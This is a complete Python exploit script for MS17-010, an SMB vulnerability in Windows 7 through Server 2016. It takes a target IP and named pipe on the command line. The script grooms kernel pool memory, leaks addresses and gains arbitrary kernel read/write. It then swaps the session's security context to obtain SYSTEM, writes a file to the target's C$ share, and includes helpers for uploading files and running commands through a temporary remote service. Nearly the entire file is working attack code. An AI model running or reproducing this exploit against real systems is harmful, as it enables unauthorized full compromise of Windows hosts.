#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 7+ by sleepya

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
'''

USERNAME = ''
PASSWORD = ''

'''
Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
win7 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	PACCESS_TOKEN Token;  // 0x08
	DWORD xx2;
	BOOLEAN CopyOnOpen; // 0x14
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x18
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x20
}
win2012 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	QWORD xx2;
	QWORD xx3;
	PACCESS_TOKEN Token;  // 0x18
	DWORD xx4;
	BOOLEAN CopyOnOpen; // 0x24
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x28
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x30
}

SrvImpersonateSecurityContext() is used in Windows 7 and later before doing any operation as logged on user.
It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. 
From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,
PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns
STATUS_SUCCESS when Token is NULL.
If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)
to do all SMB operations.
Note: fake Token might be possible, but NULL token is much easier.
'''
WIN7_INFO = {
	'SESSION_SECCTX_OFFSET': 0xa0,
	'SESSION_ISNULL_OFFSET': 0xba,
	'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x28,
}

WIN7_32_INFO = {
	'SESSION_SECCTX_OFFSET': 0x80,
	'SESSION_ISNULL_OFFSET': 0x96,
	'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x1c,
}

# win8+ info
WIN8_INFO = {
	'SESSION_SECCTX_OFFSET': 0xb0,
	'SESSION_ISNULL_OFFSET': 0xca,
	'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x38,
}

WIN8_32_INFO = {
	'SESSION_SECCTX_OFFSET': 0x88,
	'SESSION_ISNULL_OFFSET': 0x9e,
	'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x24,
}

X86_INFO = {
	'PTR_SIZE' : 4,
	'PTR_FMT' : 'I',
	'FRAG_TAG_OFFSET' : 12,
	'POOL_ALIGN' : 8,
	'SRV_BUFHDR_SIZE' : 8,
	'TRANS_SIZE' : 0xa0,  # struct size
	'TRANS_FLINK_OFFSET' : 0x18,
	'TRANS_INPARAM_OFFSET' : 0x40,
	'TRANS_OUTPARAM_OFFSET' : 0x44,
	'TRANS_INDATA_OFFSET' : 0x48,
	'TRANS_OUTDATA_OFFSET' : 0x4c,
	'TRANS_FUNCTION_OFFSET' : 0x72,
	'TRANS_MID_OFFSET' : 0x80,
}

X64_INFO = {
	'PTR_SIZE' : 8,
	'PTR_FMT' : 'Q',
	'FRAG_TAG_OFFSET' : 0x14,
	'POOL_ALIGN' : 0x10,
	'SRV_BUFHDR_SIZE' : 0x10,
	'TRANS_SIZE' : 0xf8,  # struct size
	'TRANS_FLINK_OFFSET' : 0x28,
	'TRANS_INPARAM_OFFSET' : 0x70,
	'TRANS_OUTPARAM_OFFSET' : 0x78,
	'TRANS_INDATA_OFFSET' : 0x80,
	'TRANS_OUTDATA_OFFSET' : 0x88,
	'TRANS_FUNCTION_OFFSET' : 0xb2,
	'TRANS_MID_OFFSET' : 0xc0,
}


def wait_for_request_processed(conn):
	#time.sleep(0.05)
	# send echo is faster than sleep(0.05) when connection is very good
	conn.send_echo('a')

special_mid = 0
extra_last_mid = 0
def reset_extra_mid(conn):
	global extra_last_mid, special_mid
	special_mid = (conn.next_mid() & 0xff00) - 0x100
	extra_last_mid = special_mid
	
def next_extra_mid():
	global extra_last_mid
	extra_last_mid += 1
	return extra_last_mid

# Borrow 'groom' and 'bride' word from NSA tool
# GROOM_TRANS_SIZE includes transaction name, parameters and data
GROOM_TRANS_SIZE = 0x5010


def calc_alloc_size(size, align_size):
	return (size + align_size - 1) & ~(align_size-1)

def leak_frag_size(conn, tid, fid, info):
	# A "Frag" pool is placed after the large pool allocation if last page has some free space left.
	# A "Frag" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.
	# To make exploit more generic, exploit does info leak to find a "Frag" pool size.
	# From the leak info, we can determine the target architecture too.
	mid = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-4)
	req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) # leak more 276 bytes
	
	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2)
	leakData = conn.recv_transaction_data(mid, 0x10d0+276)
	leakData = leakData[0x10d4:]  # skip parameters and its own input
	if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print('Target is 32 bit')
		if info['SESSION_SECCTX_OFFSET'] == WIN7_INFO['SESSION_SECCTX_OFFSET']:
			info.update(WIN7_32_INFO)
		elif info['SESSION_SECCTX_OFFSET'] == WIN8_INFO['SESSION_SECCTX_OFFSET']:
			info.update(WIN8_32_INFO)
		else:
			print('The exploit does not support this 32 bit target')
			sys.exit()
		info.update(X86_INFO)
	elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print('Target is 64 bit')
		info.update(X64_INFO)
	else:
		print('Not found Frag pool tag in leak data')
		sys.exit()
	
	# Calculate frag pool size
	info['FRAG_POOL_SIZE'] = ord(leakData[ info['FRAG_TAG_OFFSET']-2 ]) * info['POOL_ALIGN']
	print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))

	# groom: srv buffer header
	info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
	print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
	# groom paramters and data is alignment by 8 because it is NT_TRANS
	info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - 4 - 4 - info['TRANS_SIZE']  # empty transaction name (4), alignment (4)

	# bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
	bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
	info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
	print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
	# bride paramters and data is alignment by 4 because it is TRANS
	info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - 4 - info['TRANS_SIZE']  # empty transaction name (4)

	return info['FRAG_POOL_SIZE']


def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	trans_param = pack('<HH', fid, 0)  # param for NT_RENAME
	# fill large pagedpool holes (maybe no need)
	for i in range(numFill):
		conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)

	mid_ntrename = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
	req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B'*276) # leak more 276 bytes

	req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)
	reqs = []
	for i in range(12):
		mid = next_extra_mid()
		reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))

	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
	
	# expected transactions alignment ("Frag" pool is not shown)
	#
	#    |         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |
	#    +-------------------------------+----------------+-------------------------------+----------------+
	#    |    GROOM mid=mid_ntrename        |  extra_mid1 |         GROOM mid=fid            |  extra_mid2 |
	#    +-------------------------------+----------------+-------------------------------+----------------+
	#
	# If transactions are aligned as we expected, BRIDE transaction with mid=extra_mid1 will be leaked.
	# From leaked transaction, we get
	# - leaked transaction address from InParameter or InData
	# - transaction, with mid=extra_mid2, address from LIST_ENTRY.Flink
	# With these information, we can verify the transaction aligment from displacement.

	leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0+276)
	leakData = leakData[0x10d4:]  # skip parameters and its own input
	#open('leak.dat', 'wb').write(leakData)

	if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
		print('Not found Frag pool tag in leak data')
		return None
	
	# ================================
	# verify leak data
	# ================================
	leakData = leakData[info['FRAG_TAG_OFFSET']-4+info['FRAG_POOL_SIZE']:]
	# check pool tag and size value in buffer header
	expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
	leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
	if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
		print('No transaction struct in leak data')
		return None

	leakTrans = leakData[leakTransOffset:]

	ptrf = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+ptrf*5, leakTrans, 8)
	inparam_value = unpack_from('<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
	leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

	print('CONNECTION: 0x{:x}'.format(connection_addr))
	print('SESSION: 0x{:x}'.format(session_addr))
	print('FLINK: 0x{:x}'.format(flink_value))
	print('InParam: 0x{:x}'.format(inparam_value))
	print('MID: 0x{:x}'.format(leak_mid))

	next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
	if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
		print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
		return None
	# trans1: leak transaction
	# trans2: next transaction
	return {
		'connection': connection_addr,
		'session': session_addr,
		'next_page_addr': next_page_addr,
		'trans1_mid': leak_mid,
		'trans1_addr': inparam_value - info['TRANS_SIZE'] - 4,
		'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
		'special_mid': special_mid,
	}

def read_data(conn, info, read_addr, read_size):
	fmt = info['PTR_FMT']
	# modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data
	# modify trans2.*ParameterCount and trans2.*DataCount to limit data
	new_data = pack('<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
	new_data += pack('<II', 0, 0)  # SetupCount, MaxSetupCount
	new_data += pack('<III', 8, 8, 8)  # ParamterCount, TotalParamterCount, MaxParameterCount
	new_data += pack('<III', read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
	new_data += pack('<HH', 0, 5)  # Category, Function (NT_RENAME)
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
	
	# create one more transaction before leaking data
	# - next transaction can be used for arbitrary read/write after the current trans2 is done
	# - next transaction address is from TransactionListEntry.Flink value
	conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)

	# finish the trans2 to leak
	conn.send_nt_trans_secondary(mid=info['trans2_mid'])
	read_data = conn.recv_transaction_data(info['trans2_mid'], 8+read_size)
	
	# set new trans2 address
	info['trans2_addr'] = unpack_from('<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
	
	# set trans1.InData to &trans2
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans2 mid
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	return read_data[8:]  # no need to return parameter


def write_data(conn, info, write_addr, write_data):
	# trans2.InData
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)
	
	# write data
	conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
	wait_for_request_processed(conn)


def exploit(target, pipe_name):
	conn = MYSMB(target)
	
	# set NODELAY to make exploit much faster
	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

	info = {}

	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
		info.update(WIN7_INFO)
	elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith("Windows Server 2016 "):
		info.update(WIN8_INFO)
	else:
		print('This exploit does not support this target')
		sys.exit()

	# ================================
	# try align pagedpool and leak info until satisfy
	# ================================
	leakInfo = None
	# max attempt: 10
	for i in range(10):
		tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
		conn.set_default_tid(tid)
		# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
		fid = conn.nt_create_andx(tid, pipe_name)
		if 'FRAG_POOL_SIZE' not in info:
			leak_frag_size(conn, tid, fid, info)
		reset_extra_mid(conn)
		leakInfo = align_transaction_and_leak(conn, tid, fid, info)
		if leakInfo is not None:
			break
		print('leak failed... try again')
		conn.close(tid, fid)
		conn.disconnect_tree(tid)
	if leakInfo is None:
		return False
	
	info['fid'] = fid
	info.update(leakInfo)

	# ================================
	# shift trans1.Indata ptr with SmbWriteAndX
	# ================================
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(fid, 'A'*shift_indata_byte)

	# Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.
	#       So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
	# maxParameterCount (0x1000), trans name (4), param (4)
	indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
	indata_next_trans_displacement = info['trans2_addr'] - indata_value
	conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)

	# if the overwritten is correct, a modified transaction mid should be special_mid now.
	# a new transaction with special_mid should be error.
	recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
	if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
		print('!!! Write to wrong place !!!')
		print('the target might be crashed')
		sys.exit()

	print('success controlling groom transaction')

	# NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
	# but this method make the transation never get freed
	# I will avoid memory leak
	
	# ================================
	# modify trans1 struct to be used for arbitrary read/write
	# ================================
	print('modify trans1 struct for arbitrary read/write')
	fmt = info['PTR_FMT']
	# modify trans_special.InData to &trans1
	conn.send_nt_trans_secondary(mid=fid, data=pack('<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	# modify
	# - trans1.InParameter to &trans1. so we can modify trans1 struct with itself
	# - trans1.InData to &trans2. so we can modify trans2 easily
	conn.send_nt_trans_secondary(mid=info['special_mid'], data=pack('<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans2.mid
	info['trans2_mid'] = conn.next_mid()
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])

	# Now, read_data() and write_data() can be used for arbitrary read and write.
	# ================================
	# Modify this SMB session to be SYSTEM
	# ================================	
	# Note: Windows XP stores only PCtxtHandle and uses ImpersonateSecurityContext() for impersonation, so this
	#         method does not work on Windows XP. But with arbitrary read/write, code execution is not difficult.
	
	print('make this SMB session to be SYSTEM')
	# IsNullSession = 0, IsAdmin = 1
	write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')

	# read session struct to get SecurityContext address
	sessionData = read_data(conn, info, info['session'], 0x100)
	secCtxAddr = unpack_from('<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]

	# copy SecurityContext for restoration
	secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])

	print('overwriting session security context')
	# see FAKE_SECCTX detail at top of the file
	write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])

	# ================================
	# do whatever we want as SYSTEM over this SMB connection
	# ================================	
	try:
		smb_pwn(conn)
	except:
		pass

	# restore SecurityContext. If the exploit does not use null session, PCtxtHandle will be leaked.
	write_data(conn, info, secCtxAddr, secCtxData)

	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()
	return True

def smb_pwn(conn):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')

def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
	with open(localSrc, 'rb') as fp:
		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)

# based on impacket/examples/serviceinstall.py
def service_exec(conn, cmd):
	import random
	import string
	from impacket.dcerpc.v5 import transport, srvs, scmr
	
	service_name = ''.join([random.choice(string.letters) for i in range(4)])

	# Setup up a DCE SMBTransport with the connection already in place
	rpcsvc = conn.get_dce_rpc('svcctl')
	rpcsvc.connect()
	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
	svnHandle = None
	try:
		print("Opening SVCManager on %s....." % conn.get_remote_host())
		resp = scmr.hROpenSCManagerW(rpcsvc)
		svcHandle = resp['lpScHandle']
		
		# First we try to open the service in case it exists. If it does, we remove it.
		try:
			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')
		except Exception, e:
			if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:
				raise e  # Unexpected error
		else:
			# It exists, remove it
			scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
		
		print('Creating service %s.....' % service_name)
		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
		serviceHandle = resp['lpServiceHandle']
		
		if serviceHandle:
			# Start service
			try:
				print('Starting service %s.....' % service_name)
				scmr.hRStartServiceW(rpcsvc, serviceHandle)
				# is it really need to stop?
				# using command line always makes starting service fail because SetServiceStatus() does not get called
				print('Stoping service %s.....' % service_name)
				scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
			except Exception, e:
				print(str(e))
			
			print('Removing service %s.....' % service_name)
			scmr.hRDeleteService(rpcsvc, serviceHandle)
			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
	except Exception, e:
		print("ServiceExec Error on: %s" % conn.get_remote_host())
		print(str(e))
	finally:
		if svcHandle:
			scmr.hRCloseServiceHandle(rpcsvc, svcHandle)

	rpcsvc.disconnect()


if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

exploit(target, pipe_name)
print('Done')